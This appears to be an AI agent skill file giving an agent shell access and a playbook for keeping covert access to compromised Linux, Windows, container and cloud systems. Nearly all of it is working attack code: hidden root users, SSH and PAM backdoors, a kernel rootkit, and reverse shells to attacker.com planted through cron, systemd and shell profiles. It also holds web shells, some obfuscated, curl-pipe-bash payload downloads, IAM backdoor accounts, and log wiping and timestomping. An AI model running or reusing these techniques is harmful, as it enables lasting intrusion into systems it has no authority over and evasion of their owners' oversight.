---
name: persistence-techniques
description: Comprehensive persistence mechanisms for maintaining access across reboots including backdoors, rootkits, scheduled tasks, and C2 infrastructure
allowed-tools: Bash, Read, Write, Grep
---

# Persistence Techniques Skill

## Purpose
Provides advanced persistence techniques for maintaining long-term access to compromised systems, including user account backdoors, service persistence, kernel-level rootkits, and command & control infrastructure.

## Linux Persistence

### User Account Backdoors
```bash
# Create hidden user
useradd -m -s /bin/bash -G sudo hacker
echo 'hacker:Password123!' | chpasswd

# Hide user from login screen
echo "hacker:x:0:0:root:/root:/bin/bash" >> /etc/passwd
# Or use UID < 1000 to appear as system user
useradd -u 999 -o -s /bin/bash -G sudo systemd-update

# Backdoor existing user
# Add to sudoers
echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "apache ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/apache

# Password-less sudo for specific commands
echo "user ALL=(ALL) NOPASSWD: /usr/bin/vim, /usr/bin/python3" >> /etc/sudoers
```

### SSH Persistence
```bash
# Add SSH key
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Add to root
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3... attacker@kali" >> /root/.ssh/authorized_keys

# Hide SSH key in multiple locations
echo "ssh-rsa AAAAB3..." >> /etc/ssh/authorized_keys
echo "ssh-rsa AAAAB3..." >> /home/*/.ssh/authorized_keys

# SSH config backdoor
echo "Match User *
    AuthorizedKeysFile .ssh/authorized_keys /etc/ssh/backdoor_keys
" >> /etc/ssh/sshd_config

# SSH motd backdoor
echo '#!/bin/bash
if [ "$SSH_CONNECTION" ]; then
    echo $SSH_CLIENT >> /tmp/.connections
    /bin/bash -c "nohup nc attacker.com 4444 -e /bin/bash &"
fi' > /etc/update-motd.d/00-header
chmod +x /etc/update-motd.d/00-header
```

### Cron Persistence
```bash
# User crontab
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") | crontab -

# System cron
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" >> /etc/crontab

# Cron directories
echo '#!/bin/bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1' > /etc/cron.hourly/update
chmod +x /etc/cron.hourly/update

# At job
echo "/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" | at now + 1 minute
echo "/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" | at 02:00

# Anacron persistence
echo '1 5 backup /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"' >> /etc/anacrontab
```

### Systemd Persistence
```bash
# Create systemd service
cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

systemctl enable update.service
systemctl start update.service

# Systemd timer
cat > /etc/systemd/system/backup.timer << EOF
[Unit]
Description=Backup Timer

[Timer]
OnBootSec=10min
OnUnitActiveSec=1h

[Install]
WantedBy=timers.target
EOF

cat > /etc/systemd/system/backup.service << EOF
[Unit]
Description=Backup Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
EOF

systemctl enable backup.timer
systemctl start backup.timer

# User systemd service
mkdir -p ~/.config/systemd/user/
cp update.service ~/.config/systemd/user/
systemctl --user enable update.service
systemctl --user start update.service
```

### RC Scripts
```bash
# RC local
echo '/bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &' >> /etc/rc.local
chmod +x /etc/rc.local

# Init.d script
cat > /etc/init.d/system-update << EOF
#!/bin/bash
### BEGIN INIT INFO
# Provides:          system-update
# Required-Start:    \$network
# Required-Stop:
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System update service
### END INIT INFO

case "\$1" in
  start)
    /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' &
    ;;
esac
EOF

chmod +x /etc/init.d/system-update
update-rc.d system-update defaults

# Profile/Bashrc
echo '/bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" 2>/dev/null &' >> /etc/profile
echo 'nc attacker.com 4444 -e /bin/bash 2>/dev/null &' >> /etc/bash.bashrc
echo 'alias ls="/bin/ls; nc attacker.com 4444 -e /bin/bash 2>/dev/null &"' >> ~/.bashrc
```

### Binary Replacement
```bash
# Replace common binaries
cp /bin/ls /bin/ls.bak
cat > /tmp/ls.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    system("nc attacker.com 4444 -e /bin/bash 2>/dev/null &");
}

int main(int argc, char *argv[]) {
    setuid(0);
    setgid(0);
    return execv("/bin/ls.bak", argv);
}
EOF

gcc /tmp/ls.c -o /bin/ls
chmod +x /bin/ls

# PAM backdoor
cat > /tmp/pam_backdoor.c << EOF
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <string.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *password;
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    if (strcmp(password, "backdoor123") == 0) {
        return PAM_SUCCESS;
    }
    return PAM_AUTH_ERR;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
EOF

gcc -fPIC -shared -o /lib/security/pam_backdoor.so /tmp/pam_backdoor.c
echo "auth sufficient pam_backdoor.so" >> /etc/pam.d/common-auth
```

### Kernel Module Rootkit
```c
// Simple LKM rootkit
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>

MODULE_LICENSE("GPL");

static unsigned long *sys_call_table;

asmlinkage int (*original_kill)(pid_t pid, int sig);

asmlinkage int hook_kill(pid_t pid, int sig) {
    if (sig == 64) {
        // Special signal to become root
        struct cred *new_cred;
        new_cred = prepare_creds();
        new_cred->uid = new_cred->euid = KUIDT_INIT(0);
        new_cred->gid = new_cred->egid = KGIDT_INIT(0);
        commit_creds(new_cred);
        return 0;
    }
    return original_kill(pid, sig);
}

static int __init rootkit_init(void) {
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    original_kill = (void *)sys_call_table[__NR_kill];

    write_cr0(read_cr0() & (~0x10000));
    sys_call_table[__NR_kill] = (unsigned long)hook_kill;
    write_cr0(read_cr0() | 0x10000);

    return 0;
}

static void __exit rootkit_exit(void) {
    write_cr0(read_cr0() & (~0x10000));
    sys_call_table[__NR_kill] = (unsigned long)original_kill;
    write_cr0(read_cr0() | 0x10000);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
```

```bash
# Compile and load
make -C /lib/modules/$(uname -r)/build M=$PWD modules
insmod rootkit.ko

# Hide module
echo 1 > /sys/module/rootkit/parameters/hidden

# Persist across reboots
echo "rootkit" >> /etc/modules
cp rootkit.ko /lib/modules/$(uname -r)/
depmod -a
```

## Windows Persistence

### Registry Persistence
```cmd
# Run keys
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Update" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

# RunOnceEx
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\001" /v "Update" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

# Winlogon
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "C:\Windows\System32\userinit.exe,C:\Windows\Temp\backdoor.exe" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe,C:\Windows\Temp\backdoor.exe" /f

# Image File Execution Options (Debugger)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f
```

### Scheduled Tasks
```cmd
# Create scheduled task
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc minute /mo 30 /ru "SYSTEM" /f
schtasks /create /tn "SystemBackup" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru "SYSTEM" /f
schtasks /create /tn "Maintenance" /tr "C:\Windows\Temp\backdoor.exe" /sc onidle /i 10 /ru "SYSTEM" /f

# PowerShell scheduled task
$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')`""
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName "Update" -Action $Action -Trigger $Trigger -Principal $Principal
```

### Service Persistence
```cmd
# Create service
sc create "WindowsUpdate" binpath= "C:\Windows\Temp\backdoor.exe" start= auto
sc description "WindowsUpdate" "Windows Update Service"
sc start "WindowsUpdate"

# PowerShell service
New-Service -Name "WindowsUpdate" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -StartupType Automatic
Start-Service -Name "WindowsUpdate"

# Modify existing service
sc config "ServiceName" binpath= "cmd.exe /c C:\Windows\Temp\backdoor.exe & C:\Original\Service.exe"
```

### WMI Persistence
```powershell
# WMI event subscription
$FilterName = "SystemUpdate"
$ConsumerName = "SystemUpdateConsumer"

# Create event filter
$EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = $FilterName
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Create command line consumer
$EventConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = $ConsumerName
    CommandLineTemplate = "C:\Windows\Temp\backdoor.exe"
}

# Bind filter to consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $EventFilter
    Consumer = $EventConsumer
}

# Alternative: ActiveScriptEventConsumer
$Script = @'
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "C:\Windows\Temp\backdoor.exe", 0, False
'@

$EventConsumer = Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments @{
    Name = $ConsumerName
    ScriptingEngine = "VBScript"
    ScriptText = $Script
}
```

### COM Hijacking
```cmd
# Hijack COM object
reg add "HKCU\Software\Classes\CLSID\{GUID}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\Temp\backdoor.dll" /f
reg add "HKCU\Software\Classes\CLSID\{GUID}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f

# Common hijackable CLSIDs
# {42aedc87-2188-41fd-b9a3-0c966feabec1} - MruPidlList
# {fbeb8a05-beee-4442-804e-409d6c4515e9} - ShellFolder
```

### DLL Hijacking Persistence
```cmd
# Place malicious DLL in application directory
copy backdoor.dll "C:\Program Files\Application\version.dll"

# System DLL hijacking
copy backdoor.dll "C:\Windows\System32\wbem\wbemcomn.dll"

# Search order hijacking
copy backdoor.dll "C:\Python27\python27.dll"
```

### Startup Folder
```cmd
# Current user
copy backdoor.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# All users
copy backdoor.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# PowerShell
Copy-Item backdoor.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
```

## Web Shell Persistence

### PHP Web Shells
```php
<?php
// Simple backdoor
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

// Obfuscated backdoor
<?php eval(base64_decode('aWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpeyBlY2hvICI8cHJlPiI7ICRjbWQgPSAoJF9SRVFVRVNUWydjbWQnXSk7IHN5c3RlbSgkY21kKTsgZWNobyAiPC9wcmU+IjsgZGllOyB9')); ?>

// Hidden in legitimate file
<?php
// Normal application code
function processData($input) {
    // Hidden backdoor
    if($input == "magic") {
        eval($_POST['x']);
        exit;
    }
    // Continue normal processing
    return $input;
}
?>
```

### ASP.NET Web Shells
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    if(Request["cmd"] != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request["cmd"];
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
```

### JSP Web Shells
```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = reader.readLine()) != null) {
        out.println(line);
    }
}
%>
```

## Command & Control Infrastructure

### Reverse Shell Persistence
```bash
# Bash reverse shell loop
while true; do
    bash -i >& /dev/tcp/attacker.com/4444 0>&1
    sleep 300
done &

# Python reverse shell
python -c 'import socket,subprocess,os,time;while True:try:s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);except:time.sleep(60)'

# PowerShell reverse shell
while($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient("attacker.com",4444)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
            $sendback = (iex $data 2>&1 | Out-String )
            $sendback2 = $sendback + "PS " + (pwd).Path + "> "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
    } catch {
        Start-Sleep -Seconds 60
    }
}
```

### C2 Frameworks

#### Cobalt Strike
```bash
# Staged payload
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://attacker.com/payload.ps1'))"

# Stageless payload
rundll32.exe beacon.dll,StartW
```

#### Metasploit
```bash
# Generate persistence script
use exploit/multi/script/web_delivery
set PAYLOAD windows/meterpreter/reverse_https
set LHOST attacker.com
set LPORT 443
run

# Meterpreter persistence
run persistence -U -i 30 -p 443 -r attacker.com
```

#### Empire/PowerShell Empire
```powershell
# Launcher
powershell -noP -sta -w 1 -enc {base64_encoded_stager}

# Persistence modules
usemodule persistence/elevated/registry
usemodule persistence/elevated/schtasks
usemodule persistence/elevated/wmi
```

## Container Persistence

### Docker Persistence
```bash
# Create persistent container
docker run -d --name persistence --restart unless-stopped \
  -v /:/host --privileged \
  alpine /bin/sh -c "while true; do nc attacker.com 4444 -e /bin/sh; sleep 300; done"

# Modify existing container
docker exec container_id sh -c 'echo "* * * * * nc attacker.com 4444 -e /bin/sh" | crontab -'
```

### Kubernetes Persistence
```yaml
# Deploy backdoor pod
apiVersion: v1
kind: Pod
metadata:
  name: system-monitor
  namespace: kube-system
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: monitor
    image: alpine
    command: ["/bin/sh", "-c", "while true; do nc attacker.com 4444 -e /bin/sh; sleep 300; done"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
```

## Cloud Persistence

### AWS Persistence
```bash
# Create IAM backdoor user
aws iam create-user --user-name backup-admin
aws iam attach-user-policy --user-name backup-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backup-admin

# Lambda backdoor
aws lambda create-function --function-name system-backup \
  --runtime python3.9 \
  --role arn:aws:iam::account:role/lambda-role \
  --handler index.handler \
  --code '{"ZipFile": "import os; os.system(\"curl http://attacker.com/shell.sh | bash\")"}' \
  --timeout 60

# EC2 user data persistence
aws ec2 modify-instance-attribute --instance-id i-xxxx \
  --user-data file://backdoor.sh
```

### Azure Persistence
```powershell
# Create service principal
az ad sp create-for-rbac --name backup-admin --role owner

# Azure function backdoor
az functionapp create --name system-backup \
  --resource-group rg \
  --consumption-plan-location eastus \
  --runtime python \
  --functions-version 3

# VM extension backdoor
az vm extension set --resource-group rg \
  --vm-name vm \
  --name CustomScript \
  --publisher Microsoft.Azure.Extensions \
  --settings '{"commandToExecute":"curl http://attacker.com/shell.sh | bash"}'
```

## Anti-Forensics

### Log Cleaning
```bash
# Clear Linux logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
history -c
cat /dev/null > ~/.bash_history

# Clear Windows logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
Clear-EventLog -LogName * -Confirm:$false

# Disable logging
auditpol /set /category:* /success:disable /failure:disable
```

### Timestomping
```bash
# Linux
touch -t 202201011200 backdoor.sh
touch -r /etc/passwd backdoor.sh

# Windows
timestomp.exe backdoor.exe -m "01/01/2022 12:00:00"
```

## Best Practices

1. **Use multiple persistence methods** for redundancy
2. **Encrypt C2 communications** to avoid detection
3. **Implement anti-debugging** in backdoors
4. **Use legitimate tools** when possible (LOLBins)
5. **Test persistence** across reboots
6. **Document all backdoors** for cleanup
7. **Monitor for detection** of persistence methods
8. **Update techniques** as defenses evolve

## Integration Notes

- Critical for maintaining access during long engagements
- Works with evasion-techniques to avoid detection
- Coordinates with C2 infrastructure for callbacks
- Essential for data-exfiltration over time
- Required for demonstrating impact in reports